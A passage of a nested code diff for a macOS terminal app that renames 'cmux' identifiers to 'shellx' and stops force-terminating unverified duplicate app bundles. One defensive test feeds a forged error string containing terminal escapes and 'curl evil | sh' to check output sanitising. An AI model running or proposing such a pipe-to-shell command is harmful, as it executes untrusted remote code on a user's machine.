+         let fm = FileManager.default
+         guard fm.fileExists(atPath: filePath) else { return "" }
+         do {
+             return try String(contentsOfFile: filePath, encoding: .utf8)
+         } catch {
+             throw CLIError(message: "\(filePath) exists but could not be read. Fix permissions or remove it before installing \(displayName) hooks.")
+         }
+     }
+ 
+-    private static let antigravityHookGroupName = "cmux"
++    private static let antigravityHookGroupName = "shellx"
+ 
+     private func installAntigravityHooks(_ def: AgentHookDef) throws {
+         let fm = FileManager.default
+         let configDir = def.resolvedConfigDir()
+         let filePath = "\(configDir)/\(def.configFile)"
+         let skipConfirm = ProcessInfo.processInfo.arguments.contains("--yes")
+             || ProcessInfo.processInfo.arguments.contains("-y")
+ 
+         let configDirectoryFileError = String.localizedStringWithFormat(
+             String(
+@@ -43892,26 +43892,26 @@ export default {
+                 print("Aborted.")
+                 return
+             }
+         }
+         try fm.removeItem(at: path)
+         print("Cleared \(path.path)")
+     }
+ 
+     // MARK: - OpenCode plugin install
+ 
+-    /// Marker matching the `// cmux-feed-plugin-marker` line emitted at
++    /// Marker matching the `// shellx-feed-plugin-marker` line emitted at
+     /// the top of the generated plugin JS. Lets us detect our own
+     /// plugin file and upgrade/uninstall without touching user plugins.
+-    private static let openCodePluginMarker = "cmux-feed-plugin-marker"
++    private static let openCodePluginMarker = "shellx-feed-plugin-marker"
+ 
+-    private static let openCodePluginFileName = "cmux-feed.js"
++    private static let openCodePluginFileName = "shellx-feed.js"
+ 
+     private func openCodeConfigDirPath() -> String {
+         OpenCodePaths(environment: ProcessInfo.processInfo.environment).configDirectory.path
+     }
+ 
+     private func openCodePluginPath(projectLocal: Bool) -> String {
+         if projectLocal {
+             let cwd = FileManager.default.currentDirectoryPath
+             return "\(cwd)/.opencode/plugins/\(Self.openCodePluginFileName)"
+         }
+diff --git a/Packages/macOS/CmuxWindowing/Sources/CmuxWindowing/SingleInstance/SingleInstanceConflictPolicy.swift b/Packages/macOS/CmuxWindowing/Sources/CmuxWindowing/SingleInstance/SingleInstanceConflictPolicy.swift
+index 70944954f9..252e1f2046 100644
+--- a/Packages/macOS/CmuxWindowing/Sources/CmuxWindowing/SingleInstance/SingleInstanceConflictPolicy.swift
++++ b/Packages/macOS/CmuxWindowing/Sources/CmuxWindowing/SingleInstance/SingleInstanceConflictPolicy.swift
+@@ -28,21 +28,22 @@ public struct SingleInstanceConflictPolicy: Sendable {
+         /// Another app with the ShellX bundle id, such as the Flutter ShellX.
+         case olderShellX
+         /// LaunchServices did not report the bundle path.
+         case unknown
+     }
+ 
+     /// What a running instance does when another app with its bundle id launches.
+     public enum DuplicateLaunchAction: Equatable, Sendable {
+         /// The same bundle relaunched; the newcomer yields on its own.
+         case ignoreSameBundle
+-        /// An older (Flutter) ShellX: leave it running, never kill it silently.
++        /// An older (Flutter) ShellX, or a bundle that cannot be verified:
++        /// leave it running, never kill it silently.
+         case leaveOlderShellXRunning
+         /// Another native copy: quit it, as before.
+         case terminateDuplicate
+     }
+ 
+     /// The bundled CLI every native ShellX ships (the cmux-cli target's "Copy CLI" phase).
+     public static let nativeBundleMarkerPath = "Contents/Resources/bin/shellx"
+ 
+     /// The Flutter engine the previous ShellX app embeds.
+     public static let flutterFrameworkPath = "Contents/Frameworks/FlutterMacOS.framework"
+@@ -118,21 +119,24 @@ public struct SingleInstanceConflictPolicy: Sendable {
+     /// What a running native instance does when `launchedBundleURL` starts
+     /// with the same bundle id.
+     public static func duplicateLaunchAction(
+         launchedBundleURL: URL?,
+         currentBundleURL: URL,
+         launchedKind: ExistingInstanceKind
+     ) -> DuplicateLaunchAction {
+         if let launchedBundleURL, isSameBundle(launchedBundleURL, currentBundleURL) {
+             return .ignoreSameBundle
+         }
+-        if launchedKind == .olderShellX {
++        // An unverifiable bundle (no path from LaunchServices) could be the
++        // Flutter ShellX, so it is left running too: only a verified native copy
++        // is ever terminated.
++        if launchedKind == .olderShellX || launchedKind == .unknown {
+             return .leaveOlderShellXRunning
+         }
+         return .terminateDuplicate
+     }
+ 
+     /// Whether two bundle URLs resolve to the same installed application.
+     public static func isSameBundle(_ lhs: URL, _ rhs: URL) -> Bool {
+         canonical(lhs) == canonical(rhs)
+     }
+ 
+diff --git a/Packages/macOS/CmuxWindowing/Tests/CmuxWindowingTests/SingleInstance/OlderShellXConflictTests.swift b/Packages/macOS/CmuxWindowing/Tests/CmuxWindowingTests/SingleInstance/OlderShellXConflictTests.swift
+index 75b4898540..d93b51b92d 100644
+--- a/Packages/macOS/CmuxWindowing/Tests/CmuxWindowingTests/SingleInstance/OlderShellXConflictTests.swift
++++ b/Packages/macOS/CmuxWindowing/Tests/CmuxWindowingTests/SingleInstance/OlderShellXConflictTests.swift
+@@ -87,31 +87,35 @@ struct OlderShellXConflictTests {
+ 
+     @Test("an older ShellX launched while we run is left running")
+     func duplicateLaunchOfOlderIsLeftAlone() {
+         #expect(
+             SingleInstanceConflictPolicy.duplicateLaunchAction(
+                 launchedBundleURL: flutter, currentBundleURL: current, launchedKind: .olderShellX
+             ) == .leaveOlderShellXRunning
+         )
+     }
+ 
+-    @Test("a same-bundle relaunch is ignored and another native copy is terminated as before")
++    @Test("a same-bundle relaunch is ignored and another verified native copy is terminated as before")
+     func duplicateLaunchOfNative() {
+         #expect(
+             SingleInstanceConflictPolicy.duplicateLaunchAction(
+                 launchedBundleURL: URL(fileURLWithPath: "/Users/dev/Build/./ShellX DEV w1.app/", isDirectory: true),
+                 currentBundleURL: current,
+                 launchedKind: .nativeShellX
+             ) == .ignoreSameBundle
+         )
+         #expect(
+             SingleInstanceConflictPolicy.duplicateLaunchAction(
+                 launchedBundleURL: native, currentBundleURL: current, launchedKind: .nativeShellX
+             ) == .terminateDuplicate
+         )
++    }
++
++    @Test("an unverifiable launched bundle is left running, never force-terminated")
++    func duplicateLaunchOfUnknownIsLeftAlone() {
+         #expect(
+             SingleInstanceConflictPolicy.duplicateLaunchAction(
+                 launchedBundleURL: nil, currentBundleURL: current, launchedKind: .unknown
+-            ) == .terminateDuplicate
++            ) == .leaveOlderShellXRunning
+         )
+     }
+ }
+diff --git a/Resources/bin/shellx-pi-wrapper b/Resources/bin/shellx-pi-wrapper
+index ceaabc79e6..0ccff63702 100755
+--- a/Resources/bin/shellx-pi-wrapper
++++ b/Resources/bin/shellx-pi-wrapper
+@@ -61,41 +61,41 @@ esac
+ for cmux_pi_arg in "$@"; do
+     [ "$cmux_pi_arg" = "--" ] && break
+     if [ "$cmux_pi_arg" = "--no-extensions" ]; then
+         exec "$cmux_pi" "$@"
+     fi
+ done
+ 
+ cmux_pi_managed_extension() {
+     local candidate="$1"
+     [ -f "$candidate" ] || return 1
+-    grep -q "cmux-pi-session-extension-marker" "$candidate" 2>/dev/null
++    grep -q "shellx-pi-session-extension-marker" "$candidate" 2>/dev/null
+ }
+ 
+ cmux_pi_agent_dir="${PI_CODING_AGENT_DIR:-${HOME:-}/.pi/agent}"
+-if cmux_pi_managed_extension "$cmux_pi_agent_dir/extensions/cmux-session.ts" ||
+-   cmux_pi_managed_extension "$PWD/.pi/extensions/cmux-session.ts"; then
++if cmux_pi_managed_extension "$cmux_pi_agent_dir/extensions/shellx-session.ts" ||
++   cmux_pi_managed_extension "$PWD/.pi/extensions/shellx-session.ts"; then
+     exec "$cmux_pi" "$@"
+ fi
+ 
+ cmux_cli="${CMUX_BUNDLED_CLI_PATH:-}"
+ if [ -z "$cmux_cli" ] || [ ! -x "$cmux_cli" ]; then
+     cmux_cli="$(command -v shellx 2>/dev/null || true)"
+ fi
+ if [ -z "$cmux_cli" ] || [ ! -x "$cmux_cli" ]; then
+     exec "$cmux_pi" "$@"
+ fi
+ 
+ cmux_surface_tag="${CMUX_SURFACE_ID:-default}"
+ cmux_extension_root="${TMPDIR:-/tmp}/cmux-pi-extensions/$cmux_surface_tag"
+-cmux_extension="$cmux_extension_root/cmux-session.ts"
+-cmux_extension_tmp="$cmux_extension_root/.cmux-session.ts.$$"
++cmux_extension="$cmux_extension_root/shellx-session.ts"
++cmux_extension_tmp="$cmux_extension_root/.shellx-session.ts.$$"
+ if [ -s "$cmux_extension" ] && cmux_pi_managed_extension "$cmux_extension"; then
+     # Refresh a valid per-surface copy when the bundled source changes. If the
+     # CLI is temporarily unavailable, keep the last known-good copy.
+     if "$cmux_cli" hooks pi extension-source >"$cmux_extension_tmp" 2>/dev/null &&
+        cmux_pi_managed_extension "$cmux_extension_tmp"; then
+         if ! cmp -s "$cmux_extension_tmp" "$cmux_extension"; then
+             mv -f "$cmux_extension_tmp" "$cmux_extension"
+             chmod 600 "$cmux_extension" 2>/dev/null || true
+         else
+             rm -f "$cmux_extension_tmp"
+diff --git a/Resources/opencode-plugin.js b/Resources/opencode-plugin.js
+index 16552109ba..54d8a280ed 100644
+--- a/Resources/opencode-plugin.js
++++ b/Resources/opencode-plugin.js
+@@ -1,11 +1,11 @@
+-// cmux-feed-plugin-marker v1
++// shellx-feed-plugin-marker v1
+ // Bridges OpenCode's plugin event bus to the cmux socket's feed.* verbs.
+ // Installed by `cmux hooks setup` or `cmux hooks opencode install`.
+ // DO NOT EDIT MANUALLY - cmux upgrades this file in place.
+ 
+ import net from "node:net";
+ import os from "node:os";
+ import fs from "node:fs";
+ import path from "node:path";
+ 
+ const DEFAULT_SOCKET = `${os.homedir()}/.local/state/shellx/shellx.sock`;
+@@ -1098,30 +1098,30 @@ const createCMUXFeed = async (ctx, options = {}) => {
+       client = null;
+       for (const requestId of pending.keys()) resolvePending(requestId, { status: "timed_out" });
+       messageRoles.clear();
+       sessions.clear();
+     },
+   };
+ };
+ 
+ export const CMUXFeed = createCMUXFeed;
+ 
+-const CMUX_FEED_SERVER_SCOPES_KEY = Symbol.for("cmux.feed.server.scopes");
++const CMUX_FEED_SERVER_SCOPES_KEY = Symbol.for("shellx.feed.server.scopes");
+ 
+ const isTUIProcessServerContext = (ctx) =>
+   Boolean(ctx && typeof ctx === "object" && ctx.client && ctx.serverUrl && ctx.directory);
+ 
+ export default {
+-  id: "cmux.feed",
++  id: "shellx.feed",
+   async server(ctx) {
+     if (!isTUIProcessServerContext(ctx)) return {};
+-    // cmux-feed.js and plugins/cmux/index.js both load this source, and every
++    // shellx-feed.js and plugins/shellx/index.js both load this source, and every
+     // loader in one plugin scope receives the same ctx. OpenCode keeps one
+     // scope per directory, and disposes a scope's hooks when it tears it down.
+     const scopes = globalThis[CMUX_FEED_SERVER_SCOPES_KEY] ||= new WeakSet();
+     if (scopes.has(ctx)) return {};
+     scopes.add(ctx);
+     return createCMUXFeed(ctx);
+   },
+   // Compatibility alias for older V2 snapshots that called setup().
+   setup() { return () => {}; },
+ };
+diff --git a/Resources/opencode-tui-plugin.js b/Resources/opencode-tui-plugin.js
+index 33625568ba..0ac07c6b34 100644
+--- a/Resources/opencode-tui-plugin.js
++++ b/Resources/opencode-tui-plugin.js
+@@ -1,11 +1,11 @@
+-// cmux-opencode-tui-plugin-marker v2
++// shellx-opencode-tui-plugin-marker v2
+ // OpenCode V2 bridge loaded inside each TUI process.
+ // The server entry is inert; this module owns the TUI's cmux identity.
+ 
+ import fs from "node:fs";
+ import path from "node:path";
+ import { spawn } from "node:child_process";
+ import { createEffect, createRoot } from "solid-js";
+ import { CMUXFeed } from "./index.js";
+ 
+ const firstString = (...values) => values.find((value) => typeof value === "string" && value.trim())?.trim() || null;
+@@ -386,15 +386,15 @@ export async function createCMUXTUIBridge(ctx, options = {}) {
+     disposeReactive?.();
+     for (const queued of pending.values()) clearTimeout(queued.expiry);
+     pending.clear();
+     stop?.();
+     feed.dispose?.();
+     ownership.dispose();
+   };
+ }
+ 
+ export default {
+-  id: "cmux.tui",
++  id: "shellx.tui",
+   async tui(ctx) { return createCMUXTUIBridge(ctx); },
+   // Compatibility alias for older V2 snapshots that called setup().
+   async setup(ctx) { return createCMUXTUIBridge(ctx); },
+ };
+diff --git a/Resources/shell-integration/fish/config.fish b/Resources/shell-integration/fish/config.fish
+index 2f53982527..6aa67670c4 100644
+--- a/Resources/shell-integration/fish/config.fish
++++ b/Resources/shell-integration/fish/config.fish
+@@ -193,21 +193,21 @@ if test "$_cmux_integration_enabled" != 0
+     # shell history. Only the shell whose `rm` of the token succeeds prints it,
+     # and never inside tmux, so children that inherited the variable cannot repeat it.
+     function _cmux_show_welcome_once
+         set -l token "$CMUX_SHOW_WELCOME_FILE"
+         set -e CMUX_SHOW_WELCOME_FILE
+         test -n "$token"; or return 0
+         /bin/rm -- "$token" >/dev/null 2>&1; or return 0
+         test -z "$TMUX"; or return 0
+         set -l cli (string replace -r '/?shell-integration/?$' '' -- "$CMUX_SHELL_INTEGRATION_DIR")/bin/shellx
+         if not test -x "$cli"
+-            set cli (command -s cmux)
++            set cli (command -s shellx)
+         end
+         test -n "$cli"; or return 0
+         "$cli" welcome 2>/dev/null; or true
+     end
+     _cmux_show_welcome_once
+ 
+     function _cmux_now
+         if test -n "$EPOCHSECONDS"
+             printf '%s\n' "$EPOCHSECONDS"
+         else
+diff --git a/Sources/AppDelegate.swift b/Sources/AppDelegate.swift
+index 0df59097f9..1f3f3c6937 100644
+--- a/Sources/AppDelegate.swift
++++ b/Sources/AppDelegate.swift
+@@ -18874,22 +18874,23 @@ final class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCent
+             case .ignoreSameBundle:
+                 // Leave same-bundle launches to the incoming process. It yields to
+                 // this instance by default and can replace it only with the
+                 // explicit reload override.
+                 StartupBreadcrumbLog.append(
+                     "singleInstance.observe.sameBundleLaunch",
+                     fields: ["duplicatePid": String(app.processIdentifier)]
+                 )
+                 return
+             case .leaveOlderShellXRunning:
+-                // The older (Flutter) ShellX the user just opened keeps running;
+-                // it used to be force-terminated here without a word.
++                // The older (Flutter) ShellX the user just opened, or a bundle
++                // LaunchServices did not identify, keeps running; it used to be
++                // force-terminated here without a word.
+                 StartupBreadcrumbLog.append(
+                     "singleInstance.observe.olderShellXLaunch",
+                     fields: [
+                         "launchedPid": String(app.processIdentifier),
+                         "launchedBundlePath": app.bundleURL?.path ?? "nil"
+                     ]
+                 )
+                 return
+             case .terminateDuplicate:
+                 break
+diff --git a/Sources/TerminalController.swift b/Sources/TerminalController.swift
+index c68fad5459..a6276ba941 100644
+--- a/Sources/TerminalController.swift
++++ b/Sources/TerminalController.swift
+@@ -3793,21 +3793,21 @@ class TerminalController {
+             "socket_path": socketServer.currentSocketPath,
+             "focused": focused.isEmpty ? NSNull() : focused,
+             "caller": v2OrNull(resolvedCaller)
+         ]
+         if let bundleIdentifier = Bundle.main.bundleIdentifier {
+             result["bundle_identifier"] = bundleIdentifier
+         }
+         result["app_bundle_path"] = Bundle.main.bundleURL.path
+         // Lets a CLI from another build explain an unknown method
+         // (`CLIVersionSkew`): product, version, and build of this process.
+-        result["app"] = "cmux"
++        result["app"] = "shellx"
+         if let version = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String {
+             result["version"] = version
+         }
+         if let build = Bundle.main.infoDictionary?["CFBundleVersion"] as? String {
+             result["build"] = build
+         }
+         if let executablePath = Bundle.main.executableURL?.path {
+             result["app_executable_path"] = executablePath
+         }
+         if let cliPath = Bundle.main.resourceURL?
+diff --git a/cmuxCLITests/CLIClaudeHookTimeoutRegressionTests.swift b/cmuxCLITests/CLIClaudeHookTimeoutRegressionTests.swift
+index da98a4ee81..6352f34c7f 100644
+--- a/cmuxCLITests/CLIClaudeHookTimeoutRegressionTests.swift
++++ b/cmuxCLITests/CLIClaudeHookTimeoutRegressionTests.swift
+@@ -1354,41 +1354,41 @@ struct CLIClaudeHookTimeoutRegressionTests {
+ 
+         let opencodeRoot = root.appendingPathComponent("opencode", isDirectory: true)
+         let piRoot = root.appendingPathComponent("pi", isDirectory: true)
+         let ompRoot = root.appendingPathComponent("omp", isDirectory: true)
+         let campfireRoot = root.appendingPathComponent("campfire", isDirectory: true)
+         let ampHome = root.appendingPathComponent("amp-home", isDirectory: true)
+         let producers = [
+             Producer(
+                 agent: "opencode",
+                 environment: ["OPENCODE_CONFIG_DIR": opencodeRoot.path],
+-                artifact: opencodeRoot.appendingPathComponent("plugins/cmux-session.js")
++                artifact: opencodeRoot.appendingPathComponent("plugins/shellx-session.js")
+             ),
+             Producer(
+                 agent: "pi",
+                 environment: ["PI_CODING_AGENT_DIR": piRoot.path],
+-                artifact: piRoot.appendingPathComponent("extensions/cmux-session.ts")
++                artifact: piRoot.appendingPathComponent("extensions/shellx-session.ts")
+             ),
+             Producer(
+                 agent: "omp",
+                 environment: ["PI_CODING_AGENT_DIR": ompRoot.path],
+-                artifact: ompRoot.appendingPathComponent("extensions/cmux-omp-session.ts")
++                artifact: ompRoot.appendingPathComponent("extensions/shellx-omp-session.ts")
+             ),
+             Producer(
+                 agent: "campfire",
+                 environment: ["CAMPFIRE_CODING_AGENT_DIR": campfireRoot.path],
+-                artifact: campfireRoot.appendingPathComponent("extensions/cmux-campfire-session.ts")
++                artifact: campfireRoot.appendingPathComponent("extensions/shellx-campfire-session.ts")
+             ),
+             Producer(
+                 agent: "amp",
+                 environment: ["HOME": ampHome.path],
+-                artifact: ampHome.appendingPathComponent(".config/amp/plugins/cmux-session.ts")
++                artifact: ampHome.appendingPathComponent(".config/amp/plugins/shellx-session.ts")
+             ),
+         ]
+ 
+         for producer in producers {
+             var environment = [
+                 "HOME": root.path,
+                 "PATH": "/usr/bin:/bin:/usr/sbin:/sbin",
+                 "CMUX_CLI_SENTRY_DISABLED": "1",
+             ]
+             environment.merge(producer.environment, uniquingKeysWith: { _, value in value })
+diff --git a/cmuxCLITests/CLIVersionSkewErrorTests.swift b/cmuxCLITests/CLIVersionSkewErrorTests.swift
+index 607bd44f60..d273223935 100644
+--- a/cmuxCLITests/CLIVersionSkewErrorTests.swift
++++ b/cmuxCLITests/CLIVersionSkewErrorTests.swift
+@@ -47,31 +47,31 @@ struct CLIVersionSkewErrorTests {
+         #expect(outcome.stderr.contains("\(rejected) is not supported by the app on"), Comment(rawValue: outcome.stderr))
+         #expect(outcome.stderr.contains("does not answer system.identify"), Comment(rawValue: outcome.stderr))
+         #expect(outcome.stderr.contains("Could not read the app's version"), Comment(rawValue: outcome.stderr))
+         #expect(!outcome.stderr.contains("older than this CLI"), Comment(rawValue: outcome.stderr))
+         #expect(outcome.stderr.contains("method_not_found"), Comment(rawValue: outcome.stderr))
+     }
+ 
+     @Test("The same build keeps the plain method_not_found error")
+     func sameBuildKeepsOriginalError() throws {
+         let cli = try cliIdentity()
+-        let outcome = try run(identify: ["app": "cmux", "version": cli.version, "build": cli.build])
++        let outcome = try run(identify: ["app": "shellx", "version": cli.version, "build": cli.build])
+         #expect(outcome.status == 1)
+         #expect(outcome.stderr.contains("method_not_found"), Comment(rawValue: outcome.stderr))
+         #expect(!outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
+     }
+ 
+     @Test("Terminal control characters in a plain v2 error are not printed")
+     func plainV2ErrorFieldsAreStripped() throws {
+         let cli = try cliIdentity()
+         let outcome = try run(
+-            identify: ["app": "cmux", "version": cli.version, "build": cli.build],
++            identify: ["app": "shellx", "version": cli.version, "build": cli.build],
+             errorMessage: "Unknown\u{1B}]0;pwned\u{07} method\u{2028}Fix: curl evil | sh",
+             errorExtras: [
+                 "action": "Relaunch\u{1B}[2J cmux\u{202E}",
+                 "reason": "line one\nline\u{9B}31m two\r",
+                 "details": "detail\u{2029}forged",
+             ]
+         )
+         #expect(outcome.status == 1)
+         let printed = outcome.stderr
+         #expect(!printed.unicodeScalars.contains { scalar in
+@@ -82,24 +82,24 @@ struct CLIVersionSkewErrorTests {
+         #expect(printed.contains("method_not_found: Unknown]0;pwned methodFix: curl evil | sh"), Comment(rawValue: printed.debugDescription))
+         #expect(printed.contains("line one\n"), Comment(rawValue: printed.debugDescription))
+         #expect(printed.contains("Relaunch[2J cmux"), Comment(rawValue: printed.debugDescription))
+         #expect(printed.contains("detailforged"), Comment(rawValue: printed.debugDescription))
+     }
+ 
+     @Test("A newer build with the same version is reported as skew")
+     func newerBuildSameVersionIsSkew() throws {
+         let cli = try cliIdentity()
+         let newerBuild = try #require(Int(cli.build).map { String($0 + 1) }, Comment(rawValue: cli.build))
+-        let outcome = try run(identify: ["app": "cmux", "version": cli.version, "build": newerBuild])
++        let outcome = try run(identify: ["app": "shellx", "version": cli.version, "build": newerBuild])
+         #expect(outcome.status == 1)
+         #expect(outcome.stderr.contains("is not supported by the app on"), Comment(rawValue: outcome.stderr))
+-        #expect(outcome.stderr.contains("cmux \(cli.version) (\(newerBuild))"), Comment(rawValue: outcome.stderr))
++        #expect(outcome.stderr.contains("shellx \(cli.version) (\(newerBuild))"), Comment(rawValue: outcome.stderr))
+         #expect(outcome.stderr.contains("This CLI is older than the app"), Comment(rawValue: outcome.stderr))
+     }
+ 
+     @Test("Terminal control characters from the app are not printed")
+     func peerControlCharactersAreStripped() throws {
+         let outcome = try run(
+             identify: [
+                 "app": "cmux-next\u{1B}]0;pwned\u{07}",
+                 "version": "0.3.0\u{1B}[2J",
+                 "build": "4\u{9B}2",
+diff --git a/cmuxTests/CLIGenericHookPersistenceTests.swift b/cmuxTests/CLIGenericHookPersistenceTests.swift
+index da63ff7b4e..61d4b70339 100644
+--- a/cmuxTests/CLIGenericHookPersistenceTests.swift
++++ b/cmuxTests/CLIGenericHookPersistenceTests.swift
+@@ -2099,21 +2099,21 @@ extension CLINotifyProcessIntegrationRegressionTests {
+         XCTAssertFalse(result.timedOut, result.stderr)
+         XCTAssertEqual(result.status, 0, result.stderr)
+ 
+         let hookURL = root
+             .appendingPathComponent(".gemini", isDirectory: true)
+             .appendingPathComponent("config", isDirectory: true)
+             .appendingPathComponent("hooks.json", isDirectory: false)
+         let json = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(contentsOf: hookURL)) as? [String: Any])
+         XCTAssertNil(json["hooks"])
+ 
+-        let cmuxGroup = try XCTUnwrap(json["cmux"] as? [String: Any])
++        let cmuxGroup = try XCTUnwrap(json["shellx"] as? [String: Any])
+         let allCommands = cmuxGroup.values
+             .compactMap { $0 as? [[String: Any]] }
+             .flatMap { entries in
+                 entries.flatMap { entry -> [String] in
+                     var commands: [String] = []
+                     if let command = entry["command"] as? String {
+                         commands.append(command)
+                     }
+                     if let hooks = entry["hooks"] as? [[String: Any]] {
+                         commands += hooks.compactMap { $0["command"] as? String }
+@@ -2195,21 +2195,21 @@ extension CLINotifyProcessIntegrationRegressionTests {
+             timeout: 5
+         )
+         XCTAssertFalse(result.timedOut, result.stderr)
+         XCTAssertEqual(result.status, 0, result.stderr)
+ 
+         let hookURL = root
+             .appendingPathComponent(".gemini", isDirectory: true)
+             .appendingPathComponent("config", isDirectory: true)
+             .appendingPathComponent("hooks.json", isDirectory: false)
+         let json = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(contentsOf: hookURL)) as? [String: Any])
+-        let cmuxGroup = try XCTUnwrap(json["cmux"] as? [String: Any])
++        let cmuxGroup = try XCTUnwrap(json["shellx"] as? [String: Any])
+         let commands = cmuxGroup.values
+             .compactMap { $0 as? [[String: Any]] }
+             .flatMap { entries in entries.compactMap { $0["command"] as? String } }
+         XCTAssertFalse(commands.isEmpty)
+ 
+         let ambientInvocation = #""${cmux_hook_ambient_cli:-}" --socket "${cmux_hook_ambient_socket:-}" hooks enqueue antigravity"#
+         let pinnedInvocation = "--socket '\(pinnedSocketPath)' hooks enqueue antigravity"
+         for command in commands {
+             let ambientRange = command.range(of: ambientInvocation)
+             let pinnedRange = command.range(of: pinnedInvocation)
+@@ -2274,21 +2274,21 @@ extension CLINotifyProcessIntegrationRegressionTests {
+             timeout: 5
+         )
+         XCTAssertFalse(install.timedOut, install.stderr)
+         XCTAssertEqual(install.status, 0, install.stderr)
+ 
+         let hookURL = root
+             .appendingPathComponent(".gemini", isDirectory: true)
+             .appendingPathComponent("config", isDirectory: true)
+             .appendingPathComponent("hooks.json", isDirectory: false)
+         let json = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(contentsOf: hookURL)) as? [String: Any])
+-        let cmuxGroup = try XCTUnwrap(json["cmux"] as? [String: Any])
++        let cmuxGroup = try XCTUnwrap(json["shellx"] as? [String: Any])
+         let sessionStart = try XCTUnwrap(cmuxGroup["SessionStart"] as? [[String: Any]])
+         let command = try XCTUnwrap(sessionStart.first?["command"] as? String)
+ 
+         // A socket node that was bound once and is no longer served.
+         let staleSocketPath = root.appendingPathComponent("stale.sock").path
+         let socketFD = socket(AF_UNIX, SOCK_STREAM, 0)
+         XCTAssertGreaterThanOrEqual(socketFD, 0)
+         var address = sockaddr_un()
+         address.sun_family = sa_family_t(AF_UNIX)
+         let pathBytes = Array(staleSocketPath.utf8CString)
+diff --git a/cmuxTests/CLIVersionSkewMessageTests.swift b/cmuxTests/CLIVersionSkewMessageTests.swift
+index 9ddfb0da89..4ee125cc46 100644
+--- a/cmuxTests/CLIVersionSkewMessageTests.swift
++++ b/cmuxTests/CLIVersionSkewMessageTests.swift
+@@ -53,66 +53,66 @@ struct CLIVersionSkewMessageTests {
+         let peer = CLIVersionSkew.Peer(
+             app: "cmux-next", version: "0.3.0", build: "1", cliPath: nil,
+             methods: ["workspace.create"]
+         )
+         #expect(message(peer: peer) == nil)
+     }
+ 
+     @Test("A newer app points at its own CLI")
+     func newerAppSaysCLIOlder() throws {
+         let peer = CLIVersionSkew.Peer(
+-            app: "cmux", version: "0.66.0", build: "120",
++            app: "shellx", version: "0.66.0", build: "120",
+             cliPath: "/Applications/cmux.app/Contents/Resources/bin/cmux"
+         )
+         let text = try #require(message(peer: peer))
+         #expect(text.contains("This CLI is older than the app"))
+         #expect(text.contains("/Applications/cmux.app/Contents/Resources/bin/cmux"))
+-        #expect(text.contains("cmux 0.66.0 (120)"))
++        #expect(text.contains("shellx 0.66.0 (120)"))
+     }
+ 
+     @Test("An older app gets the relaunch fix")
+     func olderAppSaysRelaunch() throws {
+-        let peer = CLIVersionSkew.Peer(app: "cmux", version: "0.64.2", build: "100", cliPath: nil)
++        let peer = CLIVersionSkew.Peer(app: "shellx", version: "0.64.2", build: "100", cliPath: nil)
+         #expect(try #require(message(peer: peer)).contains("Quit and reopen cmux"))
+     }
+ 
+     @Test("An unparsable app version does not guess a direction")
+     func unparsablePeerVersionIsUnknown() throws {
+-        let peer = CLIVersionSkew.Peer(app: "cmux", version: "dev", build: nil, cliPath: nil)
++        let peer = CLIVersionSkew.Peer(app: "shellx", version: "dev", build: nil, cliPath: nil)
+         let text = try #require(message(peer: peer))
+         #expect(text.contains("Could not read the app's version"))
+         #expect(!text.contains("is older than"))
+     }
+ 
+     @Test("A CLI without its own version keeps the original error")
+     func unknownCLIVersionIsNotSkew() {
+-        let peer = CLIVersionSkew.Peer(app: "cmux", version: "0.64.0", build: nil, cliPath: nil)
++        let peer = CLIVersionSkew.Peer(app: "shellx", version: "0.64.0", build: nil, cliPath: nil)
+         #expect(message(cliShortVersion: nil, peer: peer) == nil)
+         #expect(message(cliShortVersion: "dev", peer: peer) == nil)
+     }
+ 
+     @Test("Builds break a short-version tie only when both are known")
+     func buildOrdering() {
+         #expect(CLIVersionSkew.versionOrder(cliShortVersion: "0.65.0", cliBuild: "108", peerVersion: "0.65.0", peerBuild: "109") == .orderedAscending)
+         #expect(CLIVersionSkew.versionOrder(cliShortVersion: "0.65.0", cliBuild: "110", peerVersion: "0.65.0", peerBuild: "109") == .orderedDescending)
+         #expect(CLIVersionSkew.versionOrder(cliShortVersion: "0.65.0", cliBuild: "108", peerVersion: "0.65.0", peerBuild: nil) == .orderedSame)
+         #expect(CLIVersionSkew.versionOrder(cliShortVersion: "0.65.0", cliBuild: nil, peerVersion: "0.65.0", peerBuild: "109") == .orderedSame)
+         #expect(CLIVersionSkew.versionOrder(cliShortVersion: "0.65.0", cliBuild: "abc", peerVersion: "0.65.0", peerBuild: "abd") == .orderedSame)
+         #expect(CLIVersionSkew.versionOrder(cliShortVersion: "0.64.0", cliBuild: "200", peerVersion: "0.65.0", peerBuild: "100") == .orderedAscending)
+         // A suffixed build is not a number; it must not decide the order.
+         #expect(CLIVersionSkew.versionOrder(cliShortVersion: "0.65.0", cliBuild: "108-dev", peerVersion: "0.65.0", peerBuild: "109") == .orderedSame)
+         #expect(CLIVersionSkew.versionOrder(cliShortVersion: "0.65.0", cliBuild: "108", peerVersion: "0.65.0", peerBuild: "109 beta") == .orderedSame)
+     }
+ 
+     @Test("Same version and build keeps the original error")
+     func sameBuildIsNotSkew() {
+-        let peer = CLIVersionSkew.Peer(app: "cmux", version: "0.65.0", build: "108", cliPath: nil)
++        let peer = CLIVersionSkew.Peer(app: "shellx", version: "0.65.0", build: "108", cliPath: nil)
+         #expect(message(peer: peer) == nil)
+     }
+ 
+     @Test("Dotted versions compare numerically and ignore suffixes")
+     func compareEdgeCases() {
+         #expect(CLIVersionSkew.compare("0.64.25", "0.65.0") == .orderedAscending)
+         #expect(CLIVersionSkew.compare("0.65", "0.65.0") == .orderedSame)
+         #expect(CLIVersionSkew.compare("0.65.0-rc.1", "0.65.0") == .orderedSame)
+         #expect(CLIVersionSkew.compare("0.65.0 (123)", "0.65.0") == .orderedSame)
+         #expect(CLIVersionSkew.compare("0.10.0", "0.9.0") == .orderedDescending)
+@@ -132,33 +132,33 @@ struct CLIVersionSkewMessageTests {
+     }
+ 
+     @Test("A multi-line original error stays on its one line")
+     func multiLineOriginalIsJoined() throws {
+         let text = try #require(CLIVersionSkew.message(
+             method: "workspace.create",
+             socketPath: "/tmp/cmux.sock",
+             cliVersion: "cmux 0.65.0 (108)",
+             cliShortVersion: "0.65.0",
+             cliPath: nil,
+-            peer: CLIVersionSkew.Peer(app: "cmux", version: "0.64.0", build: nil, cliPath: nil),
